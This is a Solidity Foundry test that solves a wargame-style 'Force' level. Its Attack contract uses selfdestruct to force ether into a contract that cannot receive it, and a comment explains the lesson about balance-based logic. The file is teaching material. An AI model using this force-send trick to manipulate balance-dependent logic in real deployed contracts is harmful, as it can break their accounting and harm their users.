// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Force.sol";

/// @custom:win-condition 
// The goal of this level is to make the balance of the contract greater than zero.

/// @custom:lesson-learned
// Eth can be force sent into any contract. Beware using a contracts eth balance in any logic as it can be manipulated.

contract Attack {
    constructor(address _victim) public payable {
        address payable addr = payable(address(_victim));
        selfdestruct(addr);
    }
}

contract ForceSolvedTest is Test {

  Force public s_force;
  Attack public s_attack;
  address payable s_user;

  function setUp() public {
    s_force = new Force();
    s_user = payable(vm.addr(1));
    vm.deal(s_user, 100000000 ether);
  }

  function testWinCondition() public {
    vm.startPrank(s_user);

    s_attack = new Attack{value: 1 ether}(address(s_force));

    assertEq(address(s_force).balance, 1 ether);
  }
 
}